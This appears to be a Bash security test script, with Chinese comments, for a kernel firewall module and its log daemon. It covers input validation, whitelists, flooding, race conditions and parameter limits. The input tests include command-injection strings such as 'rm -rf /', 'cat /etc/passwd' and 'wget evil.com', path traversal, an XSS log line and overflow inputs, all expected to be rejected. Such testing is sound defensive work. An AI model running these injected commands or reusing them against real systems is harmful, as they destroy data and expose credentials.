#!/bin/bash
# security_test.sh - 全面的安全测试脚本
# 测试防火墙模块的安全性、健壮性和抗攻击能力

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

MODULE_PATH="../build/kernel-module/firewall.ko"
PROC_DIR="/proc/firewall"

# 测试颜色
if [[ -t 1 ]]; then
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; BLUE=''; NC=''
fi

PASS=0; FAIL=0; WARN=0

pass() { PASS=$((PASS + 1)); echo -e "${GREEN}[PASS]${NC} $1"; }
fail() { FAIL=$((FAIL + 1)); echo -e "${RED}[FAIL]${NC} $1"; }
warn() { WARN=$((WARN + 1)); echo -e "${YELLOW}[WARN]${NC} $1"; }
info() { echo -e "${BLUE}[INFO]${NC} $1"; }
section() { echo ""; echo -e "${BLUE}═══════════════════════════════════════════${NC}"; echo -e "${BLUE}$1${NC}"; echo -e "${BLUE}═══════════════════════════════════════════${NC}"; }

cleanup() {
    rmmod firewall 2>/dev/null || true
    rm -f /tmp/test_*.log /tmp/test_*.tmp /tmp/sec_test_*.tmp
}
trap cleanup EXIT

# 检查 root 权限
if [[ $EUID -ne 0 ]]; then
    echo "需要 root 权限"
    exit 1
fi

# 确保模块文件存在
if [[ ! -f "$MODULE_PATH" ]]; then
    info "编译模块..."
    cd .. && make all-with-daemon 2>&1 | tail -5
    cd tests
fi

if [[ ! -f "$MODULE_PATH" ]]; then
    fail "模块文件不存在"
    exit 1
fi

# ============================================================================
# 测试 1: 输入验证安全测试
# ============================================================================
section "测试 1: 输入验证安全测试"

info "加载模块..."
insmod "$MODULE_PATH" fw_ban_time=600 fw_max_retries=3 fw_findtime=600 2>/dev/null
sleep 0.5

# 1.1 空输入
info "测试空输入..."
echo "" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "空输入被拒绝"

# 1.2 仅空白字符
info "测试空白字符..."
echo "   " | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "空白字符被拒绝"

# 1.3 无效 IP 格式
info "测试无效 IP 格式..."
echo "999.999.999.999" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "无效 IP (999.999.999.999) 被拒绝"
echo "abc.def.ghi.jkl" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "字母 IP 被拒绝"
echo "192.168.1" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "不完整 IP (192.168.1) 被拒绝"
echo "192.168.1.1.1" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "超额 IP (192.168.1.1.1) 被拒绝"

# 1.4 特殊字符注入
info "测试特殊字符注入..."
echo "192.168.1.1; rm -rf /" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "命令注入被拒绝"
echo "192.168.1.1 | cat /etc/passwd" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "管道注入被拒绝"
echo "192.168.1.1 && wget evil.com" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "逻辑运算符注入被拒绝"
echo "\$(whoami)" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "命令替换被拒绝"
echo "\`id\`" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "反引号命令替换被拒绝"

# 1.5 路径遍历攻击
info "测试路径遍历..."
echo "../../etc/passwd" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "路径遍历被拒绝"
echo "../../../proc/self/environ" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "proc 遍历被拒绝"

# 1.6 超长输入 (缓冲区溢出测试)
info "测试超长输入 (缓冲区溢出)..."
python3 -c "print('A'*100)" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "100 字符输入被拒绝"
python3 -c "print('A'*1000)" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "1000 字符输入被拒绝"
python3 -c "print('A'*10000)" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "10000 字符输入被拒绝"

# 1.7 负数和异常数值
info "测试异常数值..."
echo "-1.-1.-1.-1" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "负数 IP 被拒绝"
echo "256.0.0.1" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || pass "超出范围 IP (256.0.0.1) 被拒绝"
echo "01.02.03.04" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || warn "八进制格式可能被接受"

# 1.8 特殊 IP 地址
info "测试特殊 IP 地址保护..."
echo "0.0.0.0" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
sleep 0.2
! grep -q "0.0.0.0" "$PROC_DIR/ban_list" 2>/dev/null && pass "零地址保护" || fail "零地址被封禁"

echo "255.255.255.255" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
sleep 0.2
! grep -q "255.255.255.255" "$PROC_DIR/ban_list" 2>/dev/null && pass "广播地址保护" || fail "广播地址被封禁"

echo "224.0.0.1" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
sleep 0.2
! grep -q "224.0.0.1" "$PROC_DIR/ban_list" 2>/dev/null && pass "组播地址保护" || fail "组播地址被封禁"

echo "127.0.0.1" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
sleep 0.2
! grep -q "127.0.0.1" "$PROC_DIR/ban_list" 2>/dev/null && pass "回环地址保护" || fail "回环地址被封禁"

# ============================================================================
# 测试 2: 白名单安全测试
# ============================================================================
section "测试 2: 白名单安全测试"

# 2.1 白名单注入
info "测试系统 IP 自动白名单..."
whitelist_count=$(wc -l < "$PROC_DIR/whitelist" 2>/dev/null || echo 0)
info "系统自动发现的白名单数量: $whitelist_count"
[[ $whitelist_count -gt 0 ]] && pass "系统 IP 自动发现工作正常" || warn "未发现系统 IP"

# 2.2 手动添加白名单
info "测试手动添加白名单..."
echo "10.0.0.0/8" | tee "$PROC_DIR/whitelist_add" > /dev/null 2>&1 && pass "添加私有网段白名单" || fail "添加白名单失败"
grep -q "10.0.0.0/8" "$PROC_DIR/whitelist" 2>/dev/null && pass "白名单验证成功" || fail "白名单未显示"

# 2.3 白名单保护测试
info "测试白名单保护封禁..."
echo "10.1.2.3" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
sleep 0.2
! grep -q "10.1.2.3" "$PROC_DIR/ban_list" 2>/dev/null && pass "白名单 IP 受保护" || fail "白名单 IP 被封禁"

# 2.4 移除白名单
info "测试移除白名单..."
echo "10.0.0.0/8" | tee "$PROC_DIR/whitelist_remove" > /dev/null 2>&1 && pass "移除白名单成功" || fail "移除白名单失败"
! grep -q "10.0.0.0/8" "$PROC_DIR/whitelist" 2>/dev/null && pass "白名单移除验证" || fail "白名单仍存在"

# 2.5 白名单格式验证
info "测试无效白名单格式..."
echo "invalid_subnet" | tee "$PROC_DIR/whitelist_add" > /dev/null 2>&1 || pass "无效子网格式被拒绝"
echo "999.999.999.999/32" | tee "$PROC_DIR/whitelist_add" > /dev/null 2>&1 || pass "无效子网 IP 被拒绝"
echo "192.168.1.0/33" | tee "$PROC_DIR/whitelist_add" > /dev/null 2>&1 || pass "无效前缀长度被拒绝"

# ============================================================================
# 测试 3: 洪泛和拒绝服务攻击测试
# ============================================================================
section "测试 3: 洪泛和 DoS 攻击测试"

# 3.1 快速大量封禁
info "测试快速洪泛 (100 IP)..."
start_time=$(date +%s%N)
for i in $(seq 1 100); do
    echo "172.16.$((i/255)).$((i%255))" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
done
end_time=$(date +%s%N)
duration=$(( (end_time - start_time) / 1000000 ))
info "洪泛测试耗时: ${duration}ms"
[[ $duration -lt 5000 ]] && pass "洪泛处理性能正常 (${duration}ms)" || warn "洪泛处理较慢 (${duration}ms)"

ban_count=$(wc -l < "$PROC_DIR/ban_list" 2>/dev/null || echo 0)
info "实际封禁数量: $ban_count"
[[ $ban_count -le 1024 ]] && pass "封禁数量在限制内 (1024)" || fail "封禁数量超出限制"

# 清理
for i in $(seq 1 100); do
    echo "172.16.$((i/255)).$((i%255))" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true
done

# 3.2 并发封禁测试
info "测试并发封禁 (竞争条件)..."
start_time=$(date +%s%N)
for i in $(seq 1 50); do
    (
        echo "192.168.100.$i" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 &
    )
done
wait
end_time=$(date +%s%N)
duration=$(( (end_time - start_time) / 1000000 ))
info "并发封禁耗时: ${duration}ms"
[[ $duration -lt 10000 ]] && pass "并发封禁性能正常" || warn "并发封禁较慢"

# 3.3 极端解封测试
info "测试极端解封操作..."
start_time=$(date +%s%N)
for i in $(seq 1 100); do
    echo "192.168.100.$i" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true
done
end_time=$(date +%s%N)
duration=$(( (end_time - start_time) / 1000000 ))
info "极端解封耗时: ${duration}ms"
[[ $duration -lt 5000 ]] && pass "解封性能正常" || warn "解封较慢"

# 3.4 白名单洪泛
info "测试白名单洪泛..."
for i in $(seq 1 50); do
    echo "10.$((i/255)).$((i%255)).0/24" | tee "$PROC_DIR/whitelist_add" > /dev/null 2>&1 || true
done
whitelist_count=$(wc -l < "$PROC_DIR/whitelist" 2>/dev/null || echo 0)
info "白名单数量: $whitelist_count"
[[ $whitelist_count -le 64 ]] && pass "白名单数量在限制内 (64)" || fail "白名单数量超出限制"

# 清理白名单
for i in $(seq 1 50); do
    echo "10.$((i/255)).$((i%255)).0/24" | tee "$PROC_DIR/whitelist_remove" > /dev/null 2>&1 || true
done

# ============================================================================
# 测试 4: 哈希碰撞和数据结构完整性
# ============================================================================
section "测试 4: 哈希碰撞和数据结构完整性"

# 4.1 哈希碰撞测试
info "测试哈希碰撞抗性..."
for i in $(seq 1 100); do
    echo "192.0.2.$((i%256))" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
done
sleep 0.5

ban_count=$(wc -l < "$PROC_DIR/ban_list" 2>/dev/null || echo 0)
info "封禁列表中 IP 数量: $ban_count"
[[ $ban_count -ge 50 ]] && pass "哈希表工作正常 (>50 IP)" || fail "哈希表可能存在碰撞问题"

# 清理
for i in $(seq 1 100); do
    echo "192.0.2.$((i%256))" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true
done

# 4.2 重复封禁测试
info "测试重复封禁处理..."
TEST_IP="203.0.113.50"
echo "$TEST_IP" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
sleep 0.2
echo "$TEST_IP" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
sleep 0.2
count=$(grep -c "$TEST_IP" "$PROC_DIR/ban_list" 2>/dev/null || echo 0)
[[ $count -eq 1 ]] && pass "重复封禁未产生重复条目" || fail "出现重复封禁条目"
echo "$TEST_IP" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true

# 4.3 连续封禁解封循环
info "测试封禁/解封循环稳定性..."
for cycle in $(seq 1 10); do
    echo "198.51.100.$cycle" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
    sleep 0.1
    echo "198.51.100.$cycle" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true
done
pass "封禁/解封循环稳定"

# ============================================================================
# 测试 5: procfs 接口安全测试
# ============================================================================
section "测试 5: procfs 接口安全测试"

# 5.1 权限检查
info "测试 procfs 文件权限..."
add_ban_perms=$(stat -c %a "$PROC_DIR/add_ban" 2>/dev/null || echo "unknown")
info "add_ban 权限: $add_ban_perms"

# 5.2 读取只读接口
info "测试 procfs 读取..."
[[ -r "$PROC_DIR/ban_list" ]] && pass "ban_list 可读" || fail "ban_list 不可读"
[[ -r "$PROC_DIR/whitelist" ]] && pass "whitelist 可读" || fail "whitelist 不可读"

# 5.3 写入只写接口
info "测试 procfs 写入..."
[[ -w "$PROC_DIR/add_ban" ]] && pass "add_ban 可写" || fail "add_ban 不可写"
[[ -w "$PROC_DIR/remove_ban" ]] && pass "remove_ban 可写" || fail "remove_ban 不可写"

# 5.4 非常规操作
info "测试截断 proc 文件..."
: > "$PROC_DIR/ban_list" 2>/dev/null || pass "截断 ban_list 被拒绝 (预期)"

# ============================================================================
# 测试 6: 日志解析安全测试 (守护进程)
# ============================================================================
section "测试 6: 日志解析安全测试"

if [[ -x "../build/daemon/firewall-daemon" ]]; then
    pass "守护进程可执行"

    # 6.1 构造恶意日志文件
    info "测试畸形日志行..."
    FAKE_LOG="/tmp/test_malformed.log"
    cat > "$FAKE_LOG" << 'EOF'
这是一行完全无效格式的日志
没有任何IP地址的日志行
Failed password for root port ssh2
Failed password for root from port ssh2
Failed password for from 192.0.2.1 port ssh2
Invalid line with no structure
EOF

    # 6.2 包含特殊字符的日志
    info "测试包含特殊字符的日志..."
    cat > "/tmp/test_special_chars.log" << 'EOF'
Mar 10 10:30:01 server sshd[1234]: Failed password for root from 192.0.2.1 port 12345 ssh2
Mar 10 10:30:02 server sshd[1235]: Failed password for <script>alert('xss')</script> from 192.0.2.2 port 12346 ssh2
Mar 10 10:30:03 server sshd[1236]: Failed password for root from 192.0.2.3 port 12347 ssh2
EOF

    # 6.3 超长日志行
    info "测试超长日志行 (缓冲区溢出)..."
    python3 -c "print('Mar 10 10:30:01 server sshd[1234]: Failed password for ' + 'A'*5000 + ' from 192.0.2.100 port 12345 ssh2')" > "/tmp/test_long_line.log"

    # 6.4 空日志文件
    info "测试空日志文件..."
    : > "/tmp/test_empty.log"

    # 6.5 守护进程处理测试
    info "启动守护进程处理测试日志..."
    timeout 3 ../build/daemon/firewall-daemon --log "/tmp/test_special_chars.log" --max-retries 1 --findtime 1 --ban-time 5 --interval 1 2>&1 || true
    sleep 1

    # 验证 IP 被封禁
    if grep -q "192.0.2.1" "$PROC_DIR/ban_list" 2>/dev/null; then
        pass "正常日志行处理成功"
    else
        warn "正常日志行可能未处理"
    fi

    # 清理
    rm -f /tmp/test_*.log
else
    warn "守护进程未编译，跳过日志测试"
fi

# ============================================================================
# 测试 7: 模块参数安全测试
# ============================================================================
section "测试 7: 模块参数安全测试"

# 卸载当前模块
rmmod firewall 2>/dev/null || true
sleep 0.5

# 7.1 极端参数值
info "测试极端参数值..."
insmod "$MODULE_PATH" fw_ban_time=0 fw_max_retries=0 fw_findtime=0 2>/dev/null && warn "接受零值参数" || pass "拒绝零值参数"
rmmod firewall 2>/dev/null || true
sleep 0.3

insmod "$MODULE_PATH" fw_ban_time=999999 fw_max_retries=999 fw_findtime=999999 2>/dev/null && pass "接受大数值参数" || warn "拒绝大数值参数"
rmmod firewall 2>/dev/null || true
sleep 0.3

# 7.2 负数参数
insmod "$MODULE_PATH" fw_ban_time=-1 fw_max_retries=-1 fw_findtime=-1 2>/dev/null && warn "接受负数参数" || pass "拒绝负数参数"
rmmod firewall 2>/dev/null || true
sleep 0.3

# 7.3 正常参数加载
info "测试正常参数加载..."
insmod "$MODULE_PATH" fw_ban_time=300 fw_max_retries=5 fw_findtime=600 2>/dev/null && pass "正常参数加载成功" || fail "正常参数加载失败"
sleep 0.5

# 验证参数
ban_time=$(cat /sys/module/firewall/parameters/fw_ban_time 2>/dev/null || echo "unknown")
max_retries=$(cat /sys/module/firewall/parameters/fw_max_retries 2>/dev/null || echo "unknown")
findtime=$(cat /sys/module/firewall/parameters/fw_findtime 2>/dev/null || echo "unknown")

info "当前参数: ban_time=$ban_time, max_retries=$max_retries, findtime=$findtime"
[[ "$ban_time" == "300" ]] && pass "fw_ban_time 设置正确" || fail "fw_ban_time 设置错误"
[[ "$max_retries" == "5" ]] && pass "fw_max_retries 设置正确" || fail "fw_max_retries 设置错误"
[[ "$findtime" == "600" ]] && pass "fw_findtime 设置正确" || fail "fw_findtime 设置错误"

# ============================================================================
# 测试 8: 竞态条件和并发安全
# ============================================================================
section "测试 8: 竞态条件和并发安全"

# 8.1 同时封禁和解封
info "测试同时封禁和解封..."
for i in $(seq 1 20); do
    echo "10.10.$((i/256)).$((i%256))" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 &
    echo "10.10.$((i/256)).$((i%256))" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 &
done
wait
sleep 0.5
pass "同时封禁/解封操作未导致崩溃"

# 8.2 同时操作白名单和封禁列表
info "测试白名单和封禁列表并发操作..."
for i in $(seq 1 10); do
    echo "172.20.$((i/256)).0/24" | tee "$PROC_DIR/whitelist_add" > /dev/null 2>&1 &
    echo "172.20.$((i/256)).$((i%256))" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 &
done
wait
sleep 0.5
pass "白名单和封禁列表并发操作稳定"

# 清理
for i in $(seq 1 10); do
    echo "172.20.$((i/256)).0/24" | tee "$PROC_DIR/whitelist_remove" > /dev/null 2>&1 || true
    echo "172.20.$((i/256)).$((i%256))" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true
done

# 8.3 读取时修改
info "测试读取时修改..."
for i in $(seq 1 20); do
    (cat "$PROC_DIR/ban_list" > /dev/null 2>&1 &) &
    echo "192.168.$((i/256)).$((i%256))" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 &
done
wait
sleep 0.5
pass "读取时修改操作稳定"

# 清理
for i in $(seq 1 20); do
    echo "192.168.$((i/256)).$((i%256))" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true
done

# ============================================================================
# 测试 9: 资源泄漏测试
# ============================================================================
section "测试 9: 资源泄漏测试"

# 9.1 模块加载/卸载循环
info "测试模块加载/卸载循环..."
for i in $(seq 1 3); do
    insmod "$MODULE_PATH" 2>/dev/null && sleep 0.2
    rmmod firewall 2>/dev/null || true
    sleep 0.1
done
pass "模块加载/卸载循环稳定"

# 9.2 大量操作后模块稳定性
info "测试大量操作后模块稳定性..."
# 重新加载模块
insmod "$MODULE_PATH" 2>/dev/null || fail "模块加载失败"
sleep 0.3

for i in $(seq 1 50); do
    echo "203.0.113.$((i%256))" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
done
sleep 0.2

# 检查模块是否仍然响应
if [[ -r "$PROC_DIR/ban_list" ]]; then
    pass "大量操作后模块仍响应"
else
    fail "大量操作后模块无响应"
fi

# 清理
for i in $(seq 1 50); do
    echo "203.0.113.$((i%256))" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true
done

# ============================================================================
# 测试 10: 边界值和异常处理
# ============================================================================
section "测试 10: 边界值和异常处理"

# 10.1 最大封禁容量测试 (1024) - 缩减为 200 加快测试
info "测试封禁容量上限 (缩减为200)..."
for i in $(seq 1 200); do
    echo "10.0.$((i/256)).$((i%256))" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 || true
done
sleep 0.5

final_count=$(wc -l < "$PROC_DIR/ban_list" 2>/dev/null || echo 0)
info "封禁列表最终数量: $final_count"
[[ $final_count -le 1024 ]] && pass "封禁数量未超出上限" || fail "封禁数量超出上限"

# 清理 - 分批次
for i in $(seq 1 200); do
    echo "10.0.$((i/256)).$((i%256))" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true
    if (( i % 50 == 0 )); then
        sleep 0.05
    fi
done

# 10.2 最小值边界测试
info "测试最小值边界..."
echo "1.0.0.1" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 && pass "最小有效 IP (1.0.0.1) 被封禁" || fail "最小有效 IP 封禁失败"
echo "1.0.0.1" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true

echo "254.255.255.255" | tee "$PROC_DIR/add_ban" > /dev/null 2>&1 && pass "最大有效单播 IP 被封禁" || fail "最大有效单播 IP 封禁失败"
echo "254.255.255.255" | tee "$PROC_DIR/remove_ban" > /dev/null 2>&1 || true

# ============================================================================
# 测试 11: 守护进程安全测试
# ============================================================================
section "测试 11: 守护进程安全测试"

if [[ -x "../build/daemon/firewall-daemon" ]]; then
    # 11.1 守护进程参数注入
    info "测试守护进程参数注入..."
    ../build/daemon/firewall-daemon --help > /dev/null 2>&1 && pass "--help 正常" || fail "--help 失败"

    # 11.2 无效配置
    info "测试无效配置文件..."
    echo "invalid_config=true" > "/tmp/test_invalid.conf"
    timeout 2 ../build/daemon/firewall-daemon --config "/tmp/test_invalid.conf" 2>&1 || true
    pass "无效配置处理完成"

    # 11.3 不存在的日志文件
    info "测试不存在的日志文件..."
    timeout 2 ../build/daemon/firewall-daemon --log "/nonexistent/log/file.log" 2>&1 || true
    pass "不存在的日志文件处理完成"

    rm -f "/tmp/test_invalid.conf"
else
    warn "守护进程未编译，跳过测试"
fi

# ============================================================================
# 最终统计
# ============================================================================
echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}                     安全测试总结${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "  总计测试: $((PASS + FAIL + WARN))"
echo -e "  ${GREEN}通过: $PASS${NC}"
echo -e "  ${RED}失败: $FAIL${NC}"
echo -e "  ${YELLOW}警告: $WARN${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"

if [[ $FAIL -eq 0 ]]; then
    echo -e "${GREEN}✓ 所有安全测试通过!${NC}"
else
    echo -e "${RED}✗ 存在 $FAIL 个失败项，需要修复${NC}"
fi

exit $FAIL
